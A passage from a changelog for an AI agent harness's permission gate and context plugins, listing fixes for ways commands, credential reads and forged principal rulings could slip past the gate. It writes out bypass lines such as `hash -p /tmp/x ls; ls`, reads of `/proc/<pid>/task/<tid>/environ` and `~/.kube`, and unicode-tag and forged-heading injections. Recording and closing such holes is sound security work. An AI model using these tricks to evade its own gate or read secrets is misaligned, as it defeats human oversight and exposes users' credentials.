  read on its own line (a `\r` before the newline is trimmed), and the paths read as before still count. A local
  write of more than one file keeps each file as a part, so an exact `target:` deny or reserved entry reaches a path
  only the reading on one line found, and any later file of a patch. The call's own target and summary stay as
  main reads them: after a bare header that is still the swallowed header text.
- A post's `--body-file` is read only on a line where the gate finds no other part (#343). The exo-gate hook read
  an absolute body file before the line ran, but another part of the line could change the file before `gh` read
  it: a copy, a move, a redirect, a link or `tee` before the post, a writer after it in a pipe or in the
  background, or a redirection onto the file. An ssh hop ran `gh` where the path names another file. So `gh` posted
  text the posting rules never saw. On such a line the file now stays unread, so the post counts as unseen: it asks
  once and gets no standing grant, as a stdin body does. Any other part counts, writer or not: another command, a
  redirection to a file, an assignment that changes what runs (`GH_EDITOR=x`) or one on its own, a wrapper the gate
  does not see through, a shell, a `{ }` group, and the code around the call in `execute_code` or `python -c`.
  `nice`, `exec`, `sudo`, `env`, `timeout`, `command`, `nohup`, a variable such as `NO_COLOR=1`, a `( )` subshell
  and a redirection to `/dev/null` add no part, so the file is still read there. As on main, the gate reads
  `sudo --chroot=DIR` and `sudo -RDIR` as plain `sudo`, so the hook reads the file by its path while `gh` reads the
  one under `DIR` (#544). A copy of the post on another target (#399) is not another part. Every reading of the line
  counts, and a store read from the tool's own folder (#311) is a part too. The card says the file was not read and
  why, for each post on the line, and asks for the post on a line of its own, in place of the hint to pass an
  absolute path. A post also unseen another way, such as a title from a variable, keeps that hint beside it. The
  card no longer names a word the unread file holds. A NUL in a body-file path no longer sends the hook to its
  error card, which offered "always": the post takes the route a missing file takes, so it stays unseen and asks
  once wherever posting rules apply to it.
- `hash -p` is opaque, so a rebound program name no longer runs another file under a read's cover
  (#330). `hash -p PATH NAME` makes the shell run PATH for every later NAME, and the gate filed the
  line under NAME's own program, so `hash -p /tmp/x ls; ls` read as a plain `ls`. The call now
  classifies as `opaque_exec`, with the path as its target and a card naming the program it
  rebinds. Its options are read as bash reads them: after `builtin` or `command`, in a flag
  cluster, with the path attached and after the path. An option word the gate cannot read
  (`hash $O ls`, a glob that starts with `[` such as `hash [-]p /tmp/x ls`, or `~-`, `~+` or `~1`,
  which bash reads from OLDPWD, PWD or the directory stack) is opaque too.
  So is a path or name word it cannot read, which may split or lose its slash (`hash -p $P`,
  `hash -p [al]s`, `hash -p /tmp/x {ls,/}`), and setting `BASH_CMDS` or
  `BASH_ALIASES`. A double-quoted `${!n}` may split as `"$@"` does, so `hash "${!n}"` is opaque
  too. Plain `hash`,
  `hash -r`, `hash -d` and `hash "$cmd"` stay read, as do a `-p` after the first operand and one
  with no name to bind. The path alone is not read as a store write, nor is a `BASH_CMDS` or
  `BASH_ALIASES` value, whatever runs it (ssh, mosh, `man -P`, `printf -v`). So a post on the same
  line keeps its matrix cell and posting rules: `hash -p /proc/self/fd/3 ls; gh pr comment 1 --body hi`
  and `ssh host 'hash -p /dev/fd/3 ls'; gh pr comment 1 --body hi` are denied under a matrix deny
  for the post, as before. Some lines decide lower than before. A rebind run with sudo, doas,
  chroot, nsenter, unshare or systemd-run asks under a rule that denies costly reads, and over ssh
  a policy that allows `opaque_exec` allows it. A policy that names `read` no longer reaches the
  rebind, so `hash -p /tmp/x ls` asks under `categories: {read: deny}`. The D-038 amendment lists
  them. A plain shell command
  or a login to another host (`ssh a 'ssh b; hash -p /x ls'`) beside the rebind keeps the store
  check in either order, so
  `ssh -E ~/.exo/state/log host 'hash -p /x ls; sort x'` is a store write.
- Two Unix socket binds (`HttpServer.start_unix`) that overlapped on one event loop could leave the process umask
  at 0177 (#563, a follow-up to #317). The bind awaited inside its `umask` block, so the second block restored 0177
  after the first had restored the mask from before. Under 0177 a folder made later with a plain `mkdir` comes out
  0600, which its owner cannot enter. The socket is now bound inside the block, and the server starts on it after
  the block. A start that fails takes that socket off the event loop and closes it. The umask lock is a plain lock,
  not reentrant. A second start on a server that already started is refused before it takes anything, so it keeps
  the live start's lock and principal record. A dangling link at the socket path is replaced as a stale file is.
- Two follow-ups to #296 (#317). A ledger opened read-only through a symlink to a closed target held an
  `immutable=1` connection to the target itself: a writer that appended and checkpointed replaced the file
  under it, so the reader stayed stale and reading raised `database disk image is malformed`. The target is
  copied at open now, so reads are a snapshot of the target as it stood at open. A writer during the copy tears
  it, so the open checks the target before and after and copies it again when it changed. The copy is read-only.
  It goes into SQLite's private temporary database: a large ledger costs the reader disk space in the temporary
  folder, not memory. After three changed copies, or one that fails on an unchanged target (a full temporary
  folder), the target is read live. And where there is no `/proc` (macOS), the umask probe in `atomic_write` set
  the process mask to 077 and restored it with no lock: concurrent writes with `mode=None` interleaved set and
  restore, so files came out 0600 under a 022 mask and a run could leave the process at 077. The probe runs under
  a lock now, and so does the server's socket bind, which sets 0177 (`exo.core.private.umask`).
- `grep` and `glob` run in an owned process with a 30-second limit, so expensive regex and glob patterns no
  longer freeze the core. Timeout and turn cancellation kill and reap the worker. Secret-store skips and
  gate/executor dispatch remain in force (D-057 stage 0.5).
- Scheduled job changes require a live principal caller (#552), while listing stays available to local
  callers. A scheduled run rejects tool names outside its initial available-tool list before the gate or
  executor runs them, including blocked tools and tools registered after the run starts (D-057 stage 0.1–0.2).
- Gate policy loading rejects a non-mapping `gates.escalate` or a non-list `escalate.categories` with
  `PolicyError` (#542). Bare lists no longer silently retain defaults, and strings no longer act as category
  lists by substring membership. Omitted settings and valid mappings keep their behavior.
- A malformed `gates.escalate` no longer throws away the rest of the principal's policy in the exo-gate plugin
  (#557, after #549 for #542). The plugin used the defaults for the whole policy, so a `deny`, `reserved`,
  category, rule or matrix tightening beside `escalate: [payment]`, a null or bare `escalate:` (the template's block
  with its lines commented out) or `categories: payment` decided lower than before #549, and the internal-names
  scrub was dropped. The policy now keeps its other sections with the escalation repaired (the default escalation
  plus the names given), each call is decided under it and under the defaults, and the stricter outcome stands
  with the wider exposure and the violations and reserved parts of both.
  The reason says `policy error, stricter of your policy and the defaults applies`. When the pinned or a changed
  policy file has this error, the old and new decisions merge the same way until `/gate accept`, so the other's
  violations stand at an equal outcome. While the error stands, a standing grant applies only where the decision
  with the defaults in place of the broken file (and the decision model's verdict) also asks and finds it, so a
  grant never allows a call they log, or ask for without that grant. The names a list or a string gives
  (`escalate: [read]`, `escalate: read`) only add escalation, and `/gate` shows a standing policy error. Other
  policy errors still use the defaults alone. `normalize_policies` and `load_policies` take an optional error
  list; without it they raise as before.
- Two valid policy files (a file changed mid-session, before `/gate accept`) decide as one stricter reading in the
  exo-gate plugin (#586, after #557 for a policy error). The changed file used to win only with a strictly higher
  outcome: at an equal outcome the pinned decision stood with its own violations and exposure, and a standing grant
  was looked up against that one decision, so an unbound grant on the changed file's `reserved` entry ran a call
  the pinned file logs, and a grant bound to the exact line ran a call the pinned policy asks for without that
  binding (a sudo write line the changed files bind). The old and new decisions now merge as the gate merges a
  line's readings: the widest exposure, a third party if either has one, every violation and reserved part, and at
  an equal outcome the other side stands only when it lists a violation the standing one lacks. A standing grant
  applies only where each side's own decision (with the decision model's verdict) also asks and finds one, each
  side by its own lookup. No outcome is lower than either side's; a single valid file decides as before, grants
  included.
- The gate reads Codex `apply_patch` move destinations (`*** Move to:`) as file-write paths (#528).
  A move into a protected store or secret folder now asks, as an Add or Update header on that path does.
  Absolute links, home and environment spellings, distinctive relative names and braces use the existing checks.
  Relative aliases into a non-secret store still need #340's path resolution.
- `scripts/gate_diff.py` also runs each seed under `cmd` beside an empty `command` for a tool name the gate reads by
  its `terminal` or `shell` suffix, so a head that stops reading `cmd` there shows (#462 review). The summary shows
  each tree's violation total with what `and N more on other posts` counts.
- `scripts/gate_diff.py` counts a posting violation as often as each tree lists it, so a gate change that lists once
  what two posts of one name both meet shows as lower (#460). Each seed also runs under each tool table name that
  ends in `terminal` or `shell`, and in a call holding both `command` and `cmd`. The report shows a few reworded
  pairs, and counts each one once. The line `and N more on other posts` names no text, so its N counts in each
  tree's total instead, and a lower total is lower. A built-in line of 25 posts reaches that listing cap.
- `unset PATH` is now read as the assignment it amounts to (#329). With PATH unset, bash looks a
  command up in the working folder, so a later `ls` on the line can run a planted `./ls`. The gate
  already asked on the assignment forms (`PATH= ls`). `unset` and `unset -v` of PATH now ask the
  same way, as `opaque_exec`. `unset -f` names a function, not the variable, and stays read. An
  `unset` word the gate cannot read asks too, as a name or as an option: `unset $v`, `unset PAT?`,
  `unset {PATH,}`, `unset [P]ATH`, `unset \<newline>[P]ATH` and `unset -${f}v PATH`. The exporters
  read their options the same way, so `export +x -f $V=` and `declare -${f}x $V=` ask as
  `export $V=` does. A `readonly +x -n r=PATH` no longer asks: bash reads `+x` and `-n` there as
  names, so it makes no nameref.
- Bus relay HTTP reads reject out-of-range sequence numbers and page limits with 422 (#455). `since`,
  verification `from` and `to` now fit SQLite's integer range, and message and inbox limits must be 1-1,000.
  Oversized numbers no longer return 500, and a negative limit no longer returns the whole log.
- A fork no longer loses its copies of entries the parent undid after the fork (#245). A copy counts
  at its original's log position only while that original is visible, so once the fork's own later
  entries were summarized the tail started after the copy, and no tree held it either: the fork's
  calls dropped it. The tail now keeps such copies, in order, ahead of the fork's own entries. They stay
  verbatim, outside `tail_messages` and `/compact`, in every call of the fork. Copied context notes are
  not kept: they leave a fork's tail as before. The lookup reads only a fork's copies, so a thread that
  is not a fork pays nothing for it (D-028 amendment).
- `store.find` tokenized every node and rebuilt its BM25 tables on each call (#254, W1-5). `ctx`, `exo find`, the
  default retrieval ranker, the learner and the memory plugin all call it, so each query paid for the whole store.
  The tables (each node's word counts and length, the document frequencies, the average length) are now kept for
  the node set they were built from. A `reload()`, or a `refresh()` that sees a node file change, makes a new set
  and the next `find` builds them again. The reload drops the old tables at once, so they are not held until that
  `find`. A repeat query tokenizes only itself. Scores and order are unchanged.
- A thread's environment file is a secret store, like the process's own (#313).
  `/proc/<pid>/task/<tid>/environ` holds the same environment as `/proc/<pid>/environ`, another
  process's included, but the gate read it as an ordinary file, literal path and glob alike.
  Both the sensitive-path list and the `/proc/<pid>/<glob>` check now cover the `task/<tid>/`
  form, also with a glob in the `task` folder itself (`cat /proc/1/*/*/environ`). The search
  tools leave it out of a walk. Other files under `task/` keep their class. Such a path is
  decided as `/proc/<pid>/environ` already was, so some lines decide lower than before. A file
  tool on it asks under a `read` or `local_write` deny, a matrix deny cell for a read no longer
  applies, and on a compound line the credentials part can hide another part's matrix deny or
  a second store's `target:` entry (a post beside it keeps its violations, since #396). Beside a store write the line is
  `credentials`, so a seat delegated `credentials` may answer it, where only the principal
  answered. The D-038 amendment and `docs/GATE.md` "A thread's environment file" list them.
  #448 and #464 lift the file-tool deny and the matrix deny cells again.
- The posting rules now read every post on a line, not only the dominant one (#396). `decide` ran
  the footer, the forbidden words and the scrub on the combined classification's text. A compound
  line takes that text from its most severe part. So a post that passed, put first, carried a
  second post on the same line past all three. The checks now run on every part whose category is
  under `posting.applies_to` and that carries text, a title or an unseen body. They also run on a
  close carrying a comment (#326), and on a merge carrying a subject, a body or a body file the gate
  did not read (#397). A reopen's comment is a post, so it is checked too. Another part's violations
  are named after that part, and when two posts both have an unseen body, both are named. Once other
  posts add violations, a decision lists at most 20 and counts the rest. A single post is checked
  exactly as before. The exact-text binding already hashed the whole command, so a grant for one
  line never covered a changed second body. Third-party escalation, a matrix cell below deny and
  the floors still read the dominant part (#437).
- Terminal steer feedback distinguishes sending, queued and delivered, with a queued count beside the composer
  while you type (#361). A matching core delivery event, even before the send reply, or a successful unsteer
  acknowledgement confirms delivery; a send reply alone never does. Approval cards lead with the Ctrl+F answer sequence so they can be answered
  without clicking; the composer draft stays in place. Existing answer keys and confirmation are unchanged.
- The chat capture after each turn no longer reads the whole ledger (#263, the signals half of W2-7). To skip
  corrections and rulings already written, it built the set of capture keys from every ruling, verdict and
  question in the ledger on every turn: about 70 ms per turn with 10,000 such rows. The learner now keeps that set
  with the last row it read and reads only the rows after it, so a turn after the first takes under 1 ms. What is
  written is unchanged. A ledger that no longer holds that row in its place (another file, or one cut short) is
  read again from the first row. The HTTP client half of W2-7 and the bus store half (W3-4) stay open.
- exod answers a request with a bad number with 400 and a JSON `{"error": ...}` body (#264). `Content-Length`,
  `since` and `Last-Event-ID` were read with a bare `int()` and the handler swallowed its error, so a word or a
  float in any of them got no reply at all, and so did a negative length. A negative `since` replayed from the
  start, and a `since` past SQLite's range opened the event stream, then failed in the replay and left a
  subscription behind. Each is now a 400. A length over 8 MB is still 413, and one past 2^63 - 1 is a 400.
- A long private thread's calls stay bounded while its own summaries are pending (#244). A private thread keeps
  a summary tree of its own. Its view ends at its last summary, so every span after it rode in the tail, pending
  ones included. The turn waits up to `overflow_settle` for the leaves, so a fast summarizer bounds the call. A
  slow one did not: with 300 stored messages of 1.5k characters, the first call carried about 115k tokens, and the
  call after the first 8 of 36 leaves landed about 91k. A very long thread could exceed the model's window and
  fail the turn. While that tree has leaves pending, the call now leaves out their spans, oldest first and a whole
  leaf at a time, until what comes before the turn fits `view_budget`. A marker stands in each gap:
  `[earlier messages are being summarized]`. Both calls above are now under 5k tokens. So is a call made after a
  later leaf landed first, when the private view showed the pending leaves before it verbatim. The turn is never
  cut: its question and all after it, tool rounds and context notes included, also when the question is in such a
  leaf. Nor is a span that is not pending, such as one skipped for good, and a tool call keeps its results.
  Tool-call arguments count in full. The cut moves a whole leaf at a time, so calls between moves share their
  cached prefix. The private tree's turn now also waits up to `overflow_settle` when the cut would apply, where it
  did not wait before, so a leaf the call just scheduled can land first. It waits for that tree's own jobs only,
  not for the agent tree's. So does its wait when the private view overflows, which also waited for the agent
  tree's jobs before (#529). `/context` finds the turn as the call does, by its turn id, so during a turn it shows
  the question kept after a steer. Between turns it keeps the last turn whole, which the next turn's call can cut.
  It now gives the first stored message of the tail as `from_seq`, not the unstored private view or marker (D-068
  amendment).
- A shell call's own folder argument is read for secret stores (#311). The bash tool runs a command in
  its `cwd`, and Hermes' `terminal` and Codex's `exec_command` in their `workdir`. The gate read only
  the command text and the session's folder, so `cat config` with `~/.kube` as `cwd` was a plain read
  while `cd ~/.kube && cat config` asked. A credentials part is now added when the call reads a store
  from its folder: the folder is itself a store (a link is resolved), a relative word resolves into
  one, or the line reads a store name there as after a `cd`. The line keeps its own classification.
  So the call asks every time with no grant, also in observe mode, and its deny entries, rules, matrix
  cell, posting checks and reserved entries still apply. Before, a word that resolved into a store
  from `cwd` made the whole call credentials. That lost a matrix deny on a force push beside it, and a
  seat that may answer credentials could answer the push. That reading is still decided, and the
  stricter outcome stands. The ask goes to those who may answer both the line's category and
  credentials. A checkout in a repo's own `.claude/worktrees` is the repo's folder, not a store, but a
  store folder inside it (`.kube`) still counts. A file tool's folder argument still does not count.
  A line that reads a secret and writes the Exo store is now answered by the principal alone. On a
  line that writes the Exo store, the store read from the folder is a credentials part beside the
  write, as a key read after `tar -C` is since #464, so `deny: [credentials]` denies it. When the
  decision fails, the exo-gate hook's fallback reads these parts too, so it asks the principal
  alone, once, in observe mode too. The store read from the folder weighs as the one after a `cd`
  does since #468: a force push or `rm -rf` on the line adds its weight beside the read. So a matrix
  cell on `irreversible`, or a rule on `credentials` and `irreversible`, denies the call as it denies
  the `cd` form. GATE.md lists the cases where the two forms still differ. A gh line in such a call
  is also read as the gate read it before #399 (#439), in the folder too. The gate decides each
  reading and the hook checks each: the line, its reading from before #311, the line as read before
  #399 and that line's reading from before #311. A folder spelt through a link and `..`
  (`sdir/../policies`) is read as the kernel reads it, past the link, and folded too.
- Peer presence forgery (#132). `PeerNode.deliver` checked a peer envelope's signature against the verify key in
  the sender's presence file, and took the sender's principal from the same file. Any same-user process can write
  a presence file, so a forged one (any seat, any principal, the writer's own key) plus a self-signed envelope
  arrived framed as the principal typing in another client. The receiver now checks a peer only against keys in
  its own home: its own key for its own seat name, and for a seat of this home (a seat file here, or its key file
  in `keys/`) the key registry's entry for the name, else the `.pub` beside the seat's key file in `keys/`. A peer
  pin checks a seat too, and so does a key for a name that is no seat of this home, such as one pinned with a
  plain `exo keys pin`. The principal comes from the seat file there. A key with no seat file, such as an unseated
  daemon's or a Hermes profile's, counts as the principal `config.json` names. It is `other` to a seat whose seat
  file names a principal, and to a daemon run with an `EXO_PRINCIPAL` that `config.json` does not name. The
  principal a presence file names can only lower trust: a sender whose presence file names another principal than
  this home records is `other`, as before. A sender with no key here is held as `other`, and its card says
  `key not pinned`. A rule may hold or deny it, but never
  deliver it sooner than its policy. A registry entry decides for its name, so a key replaced with
  `exo keys pin --replace` is refused. A `from` that is not a seat name is denied before any key lookup, and the
  sender is told so. A presence file or `.pub` is read only when the open file is a plain file, so a FIFO there
  cannot stall delivery. A later receipt must name the seat the message went to, come from that seat's daemon and
  verify against that seat's keys here. Seats that share one home hold each other's keys, so they deliver as
  before. A few setups are now held or denied, each with a fix in `docs/PEERS.md` "Peer keys": a key made again
  while the registry pins the old one, a seat file naming a key outside `keys/`, a profile name that is not a seat
  id, and a key with no principal of its own toward a seat that names one. A seat of another home is pinned with
  the new `exo keys pin --peer SEAT PUB`. Its messages are then checked against that key and held as `other`, and
  its key never signs a ledger. A seat of another home with the receiver's own name is denied until it is pinned
  that way (D-026 and D-040 amendments).
- Open-decision pins are capped at the newest 12 (#398). A deferral nothing settled stayed pinned for the
  life of the session, so the pins list, the pins file and the per-turn scan over them grew without bound;
  the list is now capped where it is kept, in `_observe` and in a pin carry, at the 12 the compaction block
  and the handoff already kept. This change also corrects the upgrade note in the #385 entry below and in
  the D-040 amendment: a session last compacted on 0.2.0 loses its rulings and corrections as well as its
  open decisions, not the open decisions alone.
- A reopen's comment and a merge's subject and body are checked by the posting rules (#397).
  `gh issue reopen --comment` and `gh pr reopen -c` post a comment the gate filed as a post but
  never read, and `gh pr merge --body` was read but never checked, with `--subject` not read at
  all: text that asks as a comment post logged. A reopen now reads its comment as a close does
  (#326), a merge's subject is read as its title, and the posting rules see a merge carrying
  text, an unread body file included. A reopen or merge carrying no text is unchanged.
- A ruling a Hermes `/undo` removed in the CLI or TUI no longer comes back (#389). Hermes reports an undo to
  its memory providers, not to its context engine, so exo-context kept the undone turn's pins. The per-turn
  block put the ruling back on every turn, and since #384 every later summary block and handoff carried it
  too. exo-memory now passes the notice on through `exo.host_undo`. exo-context drops each pin that only the
  undone turns held: the last turn's at once, from the last window it saw for that session, and those of the
  earlier turns of an `/undo N` on the next turn of that session, from the host's whole transcript. Only the
  engine that saw the session's last turn acts, so an old engine left behind when Hermes builds a new agent
  never writes its stale pins. A ruling a compaction folded stays while a summary row that carries it is left,
  even when the undone turn says it again, also after a restart, in a new agent and in a `/branch` child. An
  undo that also takes that summary row drops the ruling. A transcript that does not reach back to where the
  window started drops nothing. The ruling leaves the pins, the next turn's block and every later summary
  block and handoff, after any number of compactions. A rebind puts it back no more (#592): Hermes builds a
  new agent on a `/model`, `/reasoning` or `/fast` change and on `/resume`, and every such bind merged the
  parent session's pins into the child's, so a `/branch` or compression child that had undone a ruling held
  it again and the next turn's block or compaction wrote it back. What an undo drops is now kept in the pins
  file as digests, beside the folded pins' ties, and a pin carry skips a parent pin whose digest is there. A
  first bind still inherits, a pin the child still holds carries as before, and a ruling said again after the
  undo is pinned again, so only its undone copy stays out. A `/compress` between the last turn and the undo
  keeps the earlier undone turns' pins no more (#581): the compaction folded the window's first row and the
  window was not updated, so the next turn's transcript held neither that row nor its summary part, and no
  summary row stood for it — the undo read as cut short. A compress now notes that fold in the pins file, with
  or without a pending undo, and the undo counts the noted row's summary as reaching back; a compress that
  folded only rows the window never held still counts as cut short. Compaction drops no pin on its own, so a
  ruling in the tail that `/compress here N` holds out stays pinned. A drop is logged as counts per kind and the
  session id.
  This also corrects the #385 entry below and the D-040 amendment: what a pinned block held survives
  compaction by the pins until an undo removes its turn. exo-context hears a Hermes undo only through
  exo-memory. The messaging gateway's `/undo` tells no one, and neither does the CLI from a command such as
  `/reasoning`, `/fast` or `/personality` to the next turn, so neither is covered yet. A summary row or
  handoff file written before the drop keeps the ruling until the next compaction (D-041 amendment).
- A handoff header field that spans lines can no longer add a section to the file (#395). The topic,
  session and principal, the path line and the path in the launch line are now folded to one line when
  written, so a value holding a forged `## Decisions made` heading stays inside the header or its list
  item instead of standing as a section next to the principal's real words. On the read side, the
  header parse respects quoted values, so a `-->` inside a value no longer ends the comment early.
  Sections count only after the header, and the values read back are folded too, so `/exo resume` gets
  the topic on one line. `/exo resume` also puts the header on one line, so an older file's header
  values no longer reach the model as a section. Decisions is read from its one exact heading. A header
  value that spanned lines no longer counts at all, so it loads no forged ruling, whatever it holds, a
  forged `## State` or a heading with two spaces included. Where the reader cannot tell which copy the
  writer put there, the file reads no rulings or corrections at all. That covers a forged copy in a
  path line, or in a title written before #353 (it repeated the topic unfolded), where the reader used
  to load the forged ruling. It also covers a copy in an open decision written before #353, or a copy
  next to a forged `## State` in a summary written before #349 or a list field written before #353,
  where it used to load the principal's. A file with the usual single Decisions section loads as before.
- A stock host summary stored as a user row can no longer carry a forged pinned block (#385). Such a row
  reads as the principal's own turn, and nothing escaped its tags before exo-context saw it. A row opening
  with a compaction marker now carries nothing, whatever its role. Only a system or user message that opens
  with the block itself carries one. The session pins take open decisions beside rulings and corrections, and
  follow the session id across a compression child session and a resume, so everything a pinned block held
  still survives compaction, now by the pins, in a session whose pins were observed. One upgrade note: a
  session compacted before this change holds its open decisions only inside an earlier summary's block, and
  those drop at its first compaction after the upgrade. A session last compacted before pins were observed
  at compaction at all (any 0.2.0 Hermes session: its compactions never observed pins) holds its rulings and
  corrections only in that block too, and all three drop at that first compaction. The handoff written at
  that earlier compaction still has them: read it, or run `/exo resume`, before the first compaction after
  the upgrade. A 0.2.0 handoff may quote a forged block, so read it as a record, not as the principal's words.
- A no-behaviour-change reduction took 40 lines out of the counted core (#373), undoing the #346 headroom
  raise. Dead job-notice overrides now inherit, a duplicate id helper now imports from the schema, two git
  helpers merged, and four exception clauses the next handler could never reach are gone. `CORE_HEADROOM`
  is back at 1,000 (D-077), and the counted core stands at 15,801 against a ceiling of 15,813.
- A close's comment is checked by the posting rules (#326). `gh issue close --comment` and
  `gh pr close -c` attach a comment to the close, but the gate filed the call as `github_close` and
  read no text, so the footer, the forbidden words, the scrub and the exact-text binding never saw
  it: text that asks as a comment post logged as a close. A close now reads its comment as the
  call's text, a comment the gate cannot read as gh does asks as unseen, and the posting rules see
  a close carrying a comment whether or not it is named in `applies_to`. A close with no comment,
  or a comment that passes, still logs.
- The principal's pinned block no longer drops out when a host summary rides in an assistant row (#371).
  Hosts that alternate roles put the summary there, and the row reads as the agent's, so it carries nothing
  itself. That stays so. A host can also build summary rows exo-context never escaped, and the host's
  `_compressed_summary` flag does not tell the two apart. Compaction now merges the session's pins, observed
  only from the principal's own messages and persisted per session, the way the handoff write already did.
  A `meta` that is not a mapping no longer raises in `author_of` or the carry check. It names no tag and no
  author, as it did before the veto read it.
- A pinned-block tag with an invisible unicode tag character inside its name is escaped again (#381). The
  fold added for #322 item 4 turned each tag character into its ASCII letter before matching, so a tag
  character sitting in the name as filler broke the match and the tag passed through live. Detection now
  runs over three same-length views of the text and escapes the union. The views are the text itself, the
  fold of every character whose NFKC form is one ASCII character, and that fold with tag characters decoded.
  The small brackets, mathematical and circled letters and other single-character NFKC folds are escaped too.
  Only the bracket characters change.
- A background job's completion notice no longer stalls the core (follow-up to #321). The notice reads and redacts the
  job's whole log (up to `output_cap`, 5 MB). That ran on the event loop, and one emoji in a log made it take a few
  hundred ms. Four jobs that ended together froze streams, approval cards and other turns for 2 to 3 seconds. A thread
  of its own now builds each notice, one at a time and in the order the jobs ended. The longest stall measured for those
  four fell from 1.6 to 3.0 seconds to about 30 to 110 ms. Shutting down still waits for a notice being built and, when
  no turn runs, keeps it for the next turn. The notices of jobs lost in a restart are built the same way, and the core's
  start does not wait for them, so two first commands at once still start the MCP servers only once. A turn still
  running when such a notice is built takes it at its next tool round. A hard stop that cancels a notice while it is
  built still sends the job's end event. A shutdown that runs to its end now waits for the last build and then stops the
  notice thread, which no close stopped before. After a hard stop the thread takes no more work, and the build being
  made runs on. The process waits for it as it exits. A notice that fails while exod shuts down is recorded as a
  `harness.error` event. The engine dropped its trace sink before it stopped anything, so such an error was only logged.
  It now drops it just before the session store closes, so errors in stopping channels, peers, the scheduler and MCP
  servers are recorded too (docs/JOBS.md "The completion notice", docs/DEVELOPER-GUIDE.md §1).
- Parsing pinned blocks no longer stalls on a run of unclosed `<exo-pinned>` open tags (#322, item 5). The
  lazy match rescanned to the end of the text from every open with no close after it, so 96 KB of unclosed
  opens took about five seconds in `parse_pinned_blocks` and `strip_pinned`. Both now share a linear scan
  that stops at the first open with no close after it. Block boundaries and contents read as before.
- A pinned-block tag spelled in unicode tag characters or full-width forms is now escaped like the ASCII
  tag (#322, item 4). Before, those spellings passed `defuse_pins` untouched, and anything downstream that
  folds them back to ASCII would have revived the live tag. Only the brackets change. The quoted words
  stay as written.
- A summary node stored before the #302 upgrade no longer reaches the system message with a live pinned
  block (#322, item 3). New summaries are escaped as they are made, but the tree view printed a stored
  node's text as it was. Stored summary text is now escaped where the view prints it. The escape is
  idempotent, so current summaries are unchanged.
- exo-context defused the wrong message when a protected head message quoted the end-of-summary marker
  (#322, item 2). The summary picker took the first message containing the marker, so the head message was
  escaped and pinned into instead of the summary the compressor just made, and a block the summarizer had
  copied stayed live. The picker now checks the summary flag and the compressor's own test first, and never
  picks a message the compressor merely returned from its input.
- A stamped host dict with malformed `meta` keeps its stamp again instead of raising (#375). The ingress
  veto read `meta` before the stamp, so a non-mapping `meta` crashed `author_of` where it previously
  returned the stamped author. The veto now skips a `meta` it cannot read.
- An empty ingress tag (`meta.bus: {}`, `""`) no longer reads as an untagged principal turn (#370
  follow-up). The veto added for #370 tested the tag's truthiness, so an empty bus mapping fell through to
  the legacy inference and a bus-marked message minted a principal ruling. Presence is what counts now,
  for bus, peer and job alike.
- A peer, bus or job tag in a host dict's `meta` now outranks a stamped `principal` author everywhere, not
  only on the carried-block path (#370, follow-up to #368; D-040). Before, a tagged dict carrying
  `author: "principal"` still yielded a fresh ruling and exo-context minted it into its live pinned block,
  and a scalar `meta.bus` string read as an untagged principal turn. `provenance.author_of` applies the
  ingress veto itself, so extraction, the summarizer source and the minted pins all read the tag.
- On the host path, a pinned block inside a peer, bus or job dict was lifted as the principal's rulings when the
  tag rode in `meta` or the dict carried no `author` at all (#322, item 1; D-040). An untagged assistant message
  opening with the block, or a user dict tagged only by `meta`, now classifies by its author as the core path
  does, and a peer, bus or job tag in `meta` never carries the block, whatever the role says. An untagged user
  dict still reads as the principal, so older hosts keep working.
- The grep tool read, decoded and split each whole file before searching its lines (#255, W1-4). It now streams
  the file in chunks and yields lines as they decode, so a search holds one chunk and the current line instead
  of the bytes, the text and every line at once. Output is unchanged: the same rows, the same counts past the
  limit and the same `[N more matches; narrow the search]` line. The refusals are unchanged too: a file that is
  not regular, over the 2 MB cap (including growing past it while read), or binary in its first bytes is skipped
  whole, matches already seen in it included. One limit stays: a file with no line breaks still buffers its
  single line whole, as it did before, and searching such a file is slower than the old whole-file read.
- The `scripts/deploy-site.sh` untracked-file guard no longer has three gaps (#350). A submodule under `site/` is
  one entry in the parent index, so the inventory never saw the ignored or untracked files inside it, yet `rsync`
  copied them; any submodule under `site/` now refuses the deploy (the tracked site has none). The inventory's exit
  status was dropped, so a corrupt index gave an empty list and the deploy went on; a failed inventory now stops the
  deploy with exit 1. An empty `EXO_VERCEL_CLI` fell back to the pin; it now exits 2 like any malformed value, in the
  environment or in `deploy.conf`. Found by independent review of #347.
- Two more `scripts/deploy-site.sh` gaps closed (#358, #359). A failed `git status` of `site/` read as a clean tree, so a
  versioned deploy could upload uncommitted bytes and tag `HEAD`; it now refuses with exit 1 and tags nothing. A `site/`
  that is itself a symlink (untracked, or tracked with mode 120000) hid its target from the inventory while `rsync`
  followed it; it now refuses. Symlinks inside `site/` are unchanged: `rsync -a` keeps them as links. Found by independent
  review of #352.
- `Config.load()` read and parsed `config.json` on every call (#255, W1-3). It is called from engine setup, the CLI
  and plugin code, so one process read the same unchanged file many times. The parsed file is now cached on its
  size and `mtime_ns`, each load hands out a deep copy, and `save()` refreshes the cache with what it wrote. An
  external edit is seen when its size or `mtime_ns` moves. A `set()` whose `save()` then fails, and a caller
  mutating a value `get()` returned, no longer reach the next load.
- Listing sessions ran one extra database query per session (#255, W1-2). `list_sessions` counted each session's
  messages with its own `COUNT`, so a list of 500 sessions ran 501 queries. The count now comes from the same
  query as the list: the limited selection is a subquery and each count is a correlated count over it, evaluated
  only for the rows the limit keeps (#365). A count in the outer select still ran before the sort, for every
  provisional candidate, so a limit of 1 visited every session's messages. Listing always runs
  one query and a small limit never visits other sessions' messages. Results, filters and order are unchanged.
- Two `exo serve` started at once leave exactly one (#242). The socket start (probe, unlink, bind) ran with no lock, so
  two cores could both bind, and the loser could remove the winner's pid file. It now runs under an exclusive
  `flock` on an owner-only `<socket>.lock`, held until the server closes (which removes the socket, then the lock, so a
  core that starts next is never unlinked by the one before it). The loser exits 1 naming the running core's pid, and
  only the lock holder writes `run/exod.pid`. A crashed core's lock is dropped by the OS. The lock covers all four
  `start_unix` callers (`exo serve`, peers, the TUI window server, the exo-bus plugin); TCP needed none, since a
  taken port fails at bind. `exo web`'s starter no longer removes a stale socket or writes the pid file (the core does
  both under the lock), `exo stop` leaves a starting core's files alone, only the lock refusals are reported as a
  plain line (any other error keeps its traceback in `exod.log`), and a socket in a symlinked folder (macOS `/tmp`)
  still binds.

### Security
- Gate (#471, D-038 amendment): a quoted prefix assignment no longer hides the command after it. Bash reads
  `X='a b' cmd`, `X="a b" cmd` and `X=a\ b cmd` as an assignment and runs `cmd`, but the gate read the quoted word
  as the program, an unknown one, and never read `cmd`. Beside a push that logs, that unknown program's ask was
